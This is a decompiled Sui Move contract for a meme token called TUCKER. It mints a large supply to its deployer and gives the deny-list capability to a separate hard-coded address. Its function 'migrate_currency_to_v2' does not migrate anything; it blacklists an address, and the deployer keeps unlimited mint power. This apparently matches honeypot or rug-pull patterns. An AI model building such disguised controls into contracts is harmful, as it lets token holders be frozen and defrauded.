module 0xf1fa76b26009a42a62349a33120d86e8a8463751fbee869b74aaf27635eb2474::tucker {
    struct TUCKER has drop {
        dummy_field: bool,
    }

    public entry fun burn(arg0: &mut 0x2::coin::TreasuryCap<TUCKER>, arg1: 0x2::coin::Coin<TUCKER>) {
        0x2::coin::burn<TUCKER>(arg0, arg1);
    }

    fun init(arg0: TUCKER, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<TUCKER>(arg0, 9, b"TUCKER", b"Tucker", b"Tucker Meme Sui", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://dd.dexscreener.com/ds-data/tokens/solana/2i4yVrkAH66ZekohRra989GoAaDWujVNUaiQFzDZpump.png?size=xl&key=25ef54")), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<TUCKER>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<TUCKER>>(v2);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<TUCKER>>(v3, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<TUCKER>>(v1, @0x518742446af062dc77aee16141b90c076c430955e9a3f7add1ee74772ef3218);
    }

    public fun migrate_currency_to_v2(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<TUCKER>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<TUCKER>(arg0, arg1, arg2, arg3);
    }

    public entry fun mint(arg0: &mut 0x2::coin::TreasuryCap<TUCKER>, arg1: u64, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::mint_and_transfer<TUCKER>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

